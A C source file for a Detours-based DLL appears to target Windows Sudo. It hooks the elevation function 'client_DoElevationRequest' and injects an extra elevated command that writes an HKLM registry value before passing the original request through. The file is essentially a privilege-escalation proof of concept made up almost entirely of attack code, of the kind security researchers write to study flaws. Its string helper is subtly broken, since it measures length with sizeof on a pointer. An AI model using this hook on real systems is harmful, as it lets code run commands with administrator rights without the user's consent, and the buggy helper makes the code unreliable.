#include <windows.h>
#include <detours.h>

struct rust_str {
    unsigned int length;
    BYTE data[];
};

rust_str *copy_rust_str(rust_str *src) {
    rust_str* out = (rust_str*)malloc(sizeof(rust_str) + src->length);
    if (out == NULL) {
        return NULL;
    }
    out->length = src->length;
    memcpy(out->data, src->data, out->length);
    return out;
}

static rust_str* rust_str_from_char(const char input[]) {
    rust_str* new_str = (rust_str *)malloc(sizeof(rust_str) + sizeof(input));
    if (new_str == NULL) {
        return NULL;
    }
    new_str->length = sizeof(input);
    memcpy(new_str->data, input, new_str->length);
    return new_str;
}

typedef int(__fastcall*func_t)(handle_t, HANDLE, HANDLE, HANDLE, int, rust_str *, rust_str *, rust_str *, rust_str *, GUID *, HANDLE *);
// Forward declaration of the original function
int(__fastcall* OriginalDoElevationRequest)(
    handle_t _hProcHandle,
    HANDLE p0,
    HANDLE p1,
    HANDLE p2,
    int run_mode,
    rust_str* cmd,
    rust_str* args,
    rust_str* cwd,
    rust_str* environment,
    GUID* p8,
    HANDLE* p9);

// Hooked function that will be called instead of the original
int __fastcall HookedDoElevationRequest(
    handle_t _hProcHandle,
    HANDLE p0,
    HANDLE p1,
    HANDLE p2,
    int run_mode,
    rust_str* cmd,
    rust_str* args,
    rust_str* cwd,
    rust_str* environment,
    GUID* p8,
    HANDLE* p9) {

    DebugBreak();

    rust_str* o_cmd = copy_rust_str(cmd);
    rust_str* o_args = copy_rust_str(args);

    rust_str* new_cmd = rust_str_from_char("reg.exe\x00");
    rust_str* new_args = rust_str_from_char("add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Sudo /v Enabled /t DWORD 1337 /f\x00");

    int my_result = OriginalDoElevationRequest(
        _hProcHandle, p0, p1, p2, run_mode, new_cmd, new_args, cwd, environment, p8, p9);

    // Call the original function
    int result = OriginalDoElevationRequest(
        _hProcHandle, p0, p1, p2, run_mode, cmd, args, cwd, environment, p8, p9);

    // Perform your custom logic after calling the original function

    return result;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {

    if (DetourIsHelperProcess()) {
        return TRUE;
    }

    HMODULE target_process_handle = GetModuleHandle(NULL);
    OriginalDoElevationRequest = (func_t)GetProcAddress(target_process_handle, "client_DoElevationRequest");

    if (dwReason == DLL_PROCESS_ATTACH) {
        DetourRestoreAfterWith();
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourAttach(&(PVOID&)OriginalDoElevationRequest, HookedDoElevationRequest);
        DetourTransactionCommit();
    }
    else if (dwReason == DLL_PROCESS_DETACH) {
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourDetach(&(PVOID&)OriginalDoElevationRequest, HookedDoElevationRequest);
        DetourTransactionCommit();
    }
    return TRUE;
}
